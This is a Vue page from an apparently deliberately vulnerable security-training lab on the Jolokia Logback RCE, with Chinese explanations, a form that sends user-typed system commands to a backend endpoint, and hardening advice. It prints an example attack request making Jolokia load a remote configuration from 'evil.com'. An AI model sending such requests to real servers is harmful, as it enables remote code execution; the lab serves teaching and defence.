<template>
  <vuln-template
    title="Jolokia Logback RCE"
    subtitle="Jolokia Exploitation"
    level="严重"
    :icon="DashboardOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>Jolokia Logback RCE</strong>是指通过Jolokia JMX监控接口触发Logback日志配置漏洞。
      </a-typography-paragraph>
      <a-typography-paragraph>
        Jolokia漏洞的危害：
      </a-typography-paragraph>
      <ul>
        <li>通过JMX接口执行命令</li>
        <li>远程代码执行</li>
        <li>完全控制服务器</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的Jolokia攻击命令：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        whoami
      </a-typography-paragraph>
    </template>

    <template #test-form>
      <div class="jmx-container">
        <a-card title="JMX监控工具 - Jolokia" :bordered="false" style="margin-bottom: 24px;">
          <a-typography-paragraph>
            通过Jolokia JMX接口执行系统命令进行服务器监控和管理。
          </a-typography-paragraph>
        </a-card>
        
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="系统命令"
            name="command"
            :rules="[{ required: true, message: '请输入系统命令' }]"
          >
            <a-input
              v-model:value="formState.command"
              size="large"
              placeholder="例如：whoami、id、ls -la"
              prefix="⚡"
            />
          </a-form-item>

          <a-form-item>
            <a-space>
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><dashboard-outlined /></template>
                执行命令
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </div>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>// Jolokia是一个JMX-HTTP桥接工具，暴露JMX接口为REST API
// 漏洞场景：当应用程序部署了Jolokia时

// 1. Jolokia默认暴露在 /jolokia 路径
// 2. 攻击者可以通过Jolokia调用JMX MBean方法
// 3. 如果应用程序使用Logback，可以通过Jolokia修改Logback配置
// 4. 修改Logback配置为恶意配置，触发RCE

// 攻击步骤：
// 1. 通过Jolokia访问 ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator
// 2. 调用reloadByURL方法，加载远程恶意配置文件
// 3. 恶意配置文件包含JNDI lookup，触发Log4j漏洞或直接执行代码

// 示例攻击请求：
// POST /jolokia/
// {
//   "type": "EXEC",
//   "mbean": "ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator",
//   "operation": "reloadByURL",
//   "arguments": ["http://evil.com/logback.xml"]
// }</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：Jolokia暴露JMX接口为HTTP API，攻击者可以通过Jolokia调用JMX MBean方法。如果应用程序使用Logback，攻击者可以通过Jolokia修改Logback配置，加载远程恶意配置文件，触发远程代码执行。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>禁用Jolokia：</strong>生产环境不要部署Jolokia</li>
        <li><strong>访问控制：</strong>如果必须使用，配置访问控制和认证</li>
        <li><strong>网络隔离：</strong>只允许内网访问Jolokia端点</li>
        <li><strong>升级Logback：</strong>升级Logback到安全版本</li>
        <li><strong>禁用JMX：</strong>禁用不必要的JMX功能</li>
        <li><strong>使用Spring Security：</strong>使用Spring Security保护Jolokia端点</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        // 默认配置，Jolokia暴露在 /jolokia，任何人都可以访问
// 攻击者可以调用JMX方法修改Logback配置</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：禁用Jolokia（推荐）
        // 在application.properties中：
        # 禁用Jolokia
        management.endpoint.jolokia.enabled=false
        
        # 或者完全移除Jolokia依赖
        # &lt;dependency&gt;
        #     &lt;groupId&gt;org.jolokia&lt;/groupId&gt;
        #     &lt;artifactId&gt;jolokia-core&lt;/artifactId&gt;
# &lt;/dependency&gt;</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：配置访问控制
        // 在application.properties中：
        # 只允许本地访问
        management.endpoints.web.exposure.include=health,info
        management.endpoint.jolokia.enabled=true
        
        # 配置Spring Security保护Jolokia
        @Configuration
        public class SecurityConfig extends WebSecurityConfigurerAdapter {
            @Override
            protected void configure(HttpSecurity http) throws Exception {
                http
                    .authorizeRequests()
                    .antMatchers("/jolokia/**").hasRole("ADMIN") // 只允许管理员访问
                    .and()
                    .httpBasic();
            }
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：网络隔离
        // 使用防火墙或反向代理限制访问
        // 只允许内网IP访问 /jolokia 端点
        
        // Nginx配置示例：
        location /jolokia {
            allow 10.0.0.0/8;      # 只允许内网
            allow 192.168.0.0/16;
            deny all;
            proxy_pass http://localhost:8080;
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：升级Logback并禁用JMX
        // 在logback.xml中禁用JMX：
        &lt;configuration&gt;
            &lt;jmxConfigurator/&gt; &lt;!-- 删除此行，禁用JMX配置 --&gt;
            &lt;!-- 其他配置... --&gt;
        &lt;/configuration&gt;
        
// 或者升级到Logback 1.2.12+版本，默认禁用reloadByURL</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode6" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例5：使用Spring Boot Actuator替代
        // 使用Spring Boot Actuator的JMX端点，而不是Jolokia
        // Actuator提供更好的安全控制
        management.endpoints.web.exposure.include=health,metrics
management.endpoint.health.show-details=when-authorized</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { DashboardOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `// Jolokia是一个JMX-HTTP桥接工具，暴露JMX接口为REST API
// 漏洞场景：当应用程序部署了Jolokia时

// 1. Jolokia默认暴露在 /jolokia 路径
// 2. 攻击者可以通过Jolokia调用JMX MBean方法
// 3. 如果应用程序使用Logback，可以通过Jolokia修改Logback配置
// 4. 修改Logback配置为恶意配置，触发RCE

// 攻击步骤：
// 1. 通过Jolokia访问 ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator
// 2. 调用reloadByURL方法，加载远程恶意配置文件
// 3. 恶意配置文件包含JNDI lookup，触发Log4j漏洞或直接执行代码

// 示例攻击请求：
// POST /jolokia/
// {
//   "type": "EXEC",
//   "mbean": "ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator",
//   "operation": "reloadByURL",
//   "arguments": ["http://evil.com/logback.xml"]
// }`

const fixCode1 = `// 错误示例(易受攻击)
// 默认配置，Jolokia暴露在 /jolokia，任何人都可以访问
// 攻击者可以调用JMX方法修改Logback配置`

const fixCode2 = `// 正确示例1：禁用Jolokia（推荐）
// 在application.properties中：
# 禁用Jolokia
management.endpoint.jolokia.enabled=false

# 或者完全移除Jolokia依赖
# <dependency>
#     <groupId>org.jolokia</groupId>
#     <artifactId>jolokia-core</artifactId>
# </dependency>`

const fixCode3 = `// 正确示例2：配置访问控制
// 在application.properties中：
# 只允许本地访问
management.endpoints.web.exposure.include=health,info
management.endpoint.jolokia.enabled=true

# 配置Spring Security保护Jolokia
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
            .antMatchers("/jolokia/**").hasRole("ADMIN") // 只允许管理员访问
            .and()
            .httpBasic();
    }
}`

const fixCode4 = `// 正确示例3：网络隔离
// 使用防火墙或反向代理限制访问
// 只允许内网IP访问 /jolokia 端点

// Nginx配置示例：
location /jolokia {
    allow 10.0.0.0/8;      # 只允许内网
    allow 192.168.0.0/16;
    deny all;
    proxy_pass http://localhost:8080;
}`

const fixCode5 = `// 正确示例4：升级Logback并禁用JMX
// 在logback.xml中禁用JMX：
<configuration>
    <jmxConfigurator/> <!-- 删除此行，禁用JMX配置 -->
    <!-- 其他配置... -->
</configuration>

// 或者升级到Logback 1.2.12+版本，默认禁用reloadByURL`

const fixCode6 = `// 正确示例5：使用Spring Boot Actuator替代
// 使用Spring Boot Actuator的JMX端点，而不是Jolokia
// Actuator提供更好的安全控制
management.endpoints.web.exposure.include=health,metrics
management.endpoint.health.show-details=when-authorized`

const formState = reactive({
  command: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/actuators/jolokialogback', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.command = ''
  result.value = ''
}
</script>
